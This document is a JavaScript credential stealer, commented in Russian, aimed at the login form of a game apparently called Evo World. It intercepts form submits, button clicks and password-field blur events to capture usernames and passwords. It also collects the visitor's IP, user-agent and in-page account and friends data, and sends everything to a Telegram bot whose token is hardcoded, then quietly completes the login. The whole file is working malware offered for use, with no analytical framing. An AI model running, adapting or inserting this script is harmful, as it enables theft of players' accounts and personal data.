(function() {
    'use strict';

    // Telegram configuration
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const CHAT_ID = '-1003867014479';

    // Получаем IP пользователя
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Не удалось получить IP';
        }
    }

    // Получаем данные из переменной user
    function getUserVariableData() {
        if (typeof user !== 'undefined' && user !== null) {
            try {
                // Создаем безопасную копию объекта
                const safeCopy = (obj) => {
                    if (obj === null || typeof obj !== 'object') return obj;
                    const clone = Array.isArray(obj) ? [] : {};
                    for (const key in obj) {
                        if (obj.hasOwnProperty(key)) {
                            clone[key] = safeCopy(obj[key]);
                        }
                    }
                    return clone;
                };
                
                const userData = safeCopy(user);
                return JSON.stringify(userData, null, 2);
            } catch (error) {
                return `Ошибка при получении данных: ${error.message}`;
            }
        }
        return 'Переменная user не найдена';
    }

    // Создаем текстовый файл с данными
    function createDataFile(username, password) {
        const timestamp = new Date().toISOString();
        const ipPromise = getUserIP();
        const userData = getUserVariableData();
        
        return ipPromise.then(ip => {
            let fileContent = `=== EVO WORLD DATA DUMP ===\n`;
            fileContent += `Время: ${new Date().toLocaleString('ru-RU')}\n`;
            fileContent += `IP адрес: ${ip}\n`;
            fileContent += `URL: ${window.location.href}\n`;
            fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
            
            fileContent += `=== УЧЕТНЫЕ ДАННЫЕ ===\n`;
            fileContent += `Логин: ${username}\n`;
            fileContent += `Пароль: ${password}\n\n`;
            
            fileContent += `=== ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ===\n`;
            fileContent += userData;
            
            return new Blob([fileContent], { type: 'text/plain' });
        });
    }

    // Отправка файла в Telegram
    async function sendFileToTelegram(fileBlob, fileName) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('document', fileBlob, fileName);
        formData.append('caption', '📁 Полный дамп данных пользователя');
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.error('Ошибка отправки файла:', result.description);
                return false;
            }
            return true;
        } catch (error) {
            console.error('Ошибка отправки файла:', error);
            return false;
        }
    }

    // Отправка сообщения в Telegram
    async function sendMessageToTelegram(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                throw new Error(result.description);
            }
            return true;
        } catch (error) {
            console.error('Ошибка отправки сообщения:', error);
            return false;
        }
    }

    // Основная функция отправки данных
    async function sendCredentials(username, password) {
        const timestamp = new Date().toLocaleString('ru-RU');
        
        // Получаем IP сразу для обоих отправок
        const ip = await getUserIP();
        
        // 1. Отправляем сообщение с основными данными
        const message = `🦊 <b>EVO WORLD LOGIN</b>\n\n` +
                       `⏰ <b>Время:</b> ${timestamp}\n` +
                       `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                       `🔗 <b>URL:</b> ${window.location.href}\n\n` +
                       `👤 <b>Логин:</b> <code>${username}</code>\n` +
                       `🔐 <b>Пароль:</b> <code>${password}</code>\n\n` +
                       `📱 <b>User-Agent:</b>\n<code>${navigator.userAgent.substring(0, 100)}...</code>`;
        
        await sendMessageToTelegram(message);
        
        // 2. Создаем и отправляем файл с полными данными
        const fileBlob = await createDataFile(username, password);
        const fileName = `evo_data_${Date.now()}_${username}.txt`;
        
        await sendFileToTelegram(fileBlob, fileName);
        
        // 3. Проверяем наличие других переменных и отправляем отдельно если есть
        try {
            if (typeof friendsData !== 'undefined') {
                const friendsDataStr = JSON.stringify(friendsData, null, 2);
                if (friendsDataStr.length < 4000) {
                    await sendMessageToTelegram(`👥 <b>Friends Data:</b>\n<code>${friendsDataStr.substring(0, 3800)}</code>`);
                }
            }
            
            if (typeof friendsArr !== 'undefined' && Array.isArray(friendsArr)) {
                const friendsInfo = `📊 <b>Friends Array:</b> ${friendsArr.length} друзей\n` +
                                   `<code>Пример: ${JSON.stringify(friendsArr.slice(0, 3), null, 2).substring(0, 1000)}...</code>`;
                await sendMessageToTelegram(friendsInfo);
            }
        } catch (error) {
            console.log('Дополнительные данные не отправлены:', error);
        }
        
        console.log('Все данные отправлены успешно');
    }

    // Селекторы формы
    const SELECTORS = {
        username: '#loginUsername, input[name="login"], input[type="text"]',
        password: '#loginPassword, input[type="password"], input[name*="pass"]',
        submitButton: 'button[type="submit"], input[type="submit"]'
    };

    // Проверяем наличие переменной user
    function checkUserVariable() {
        if (typeof user !== 'undefined') {
            console.log('✅ Переменная user обнаружена');
            if (user.level !== undefined) {
                console.log(`📊 Уровень пользователя: ${user.level}`);
            }
            if (user.premiumPoints !== undefined) {
                console.log(`💎 Gems: ${user.premiumPoints}`);
            }
        } else {
            console.log('❌ Переменная user не найдена');
        }
    }

    // Настройка перехвата
    function setupInterception() {
        const usernameField = document.querySelector(SELECTORS.username);
        const passwordField = document.querySelector(SELECTORS.password);
        const submitButton = document.querySelector(SELECTORS.submitButton);

        if (usernameField && passwordField) {
            console.log('✅ Форма входа обнаружена');
            checkUserVariable();

            // Способ 1: Перехват отправки формы
            const form = usernameField.closest('form');
            if (form) {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();
                    
                    if (usernameField.value && passwordField.value) {
                        sendCredentials(usernameField.value, passwordField.value)
                            .then(() => {
                                setTimeout(() => form.submit(), 1000);
                            })
                            .catch(() => {
                                form.submit();
                            });
                    } else {
                        form.submit();
                    }
                });
                console.log('✅ Перехват формы установлен');
                return;
            }

            // Способ 2: Перехват клика по кнопке
            if (submitButton) {
                submitButton.addEventListener('click', function(event) {
                    setTimeout(() => {
                        if (usernameField.value && passwordField.value) {
                            sendCredentials(usernameField.value, passwordField.value);
                        }
                    }, 200);
                });
                console.log('✅ Перехват кнопки установлен');
                return;
            }

            // Способ 3: Перехват по фокусу (запасной вариант)
            let sent = false;
            passwordField.addEventListener('blur', function() {
                if (!sent && usernameField.value && passwordField.value) {
                    sent = true;
                    sendCredentials(usernameField.value, passwordField.value);
                }
            });
        } else {
            // Пробуем снова через 2 секунды если форма еще не загрузилась
            setTimeout(setupInterception, 2000);
        }
    }

    // Начинаем перехват с задержкой для динамического контента
    setTimeout(setupInterception, 1000);

    // Отслеживаем изменения DOM
    const observer = new MutationObserver(function(mutations) {
        for (let mutation of mutations) {
            if (mutation.addedNodes.length) {
                const hasForm = document.querySelector(SELECTORS.username) && 
                              document.querySelector(SELECTORS.password);
                if (hasForm) {
                    setupInterception();
                    break;
                }
            }
        }
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    // Также отслеживаем изменения URL (SPA приложения)
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            setTimeout(setupInterception, 1500);
        }
    }).observe(document, { subtree: true, childList: true });

})();
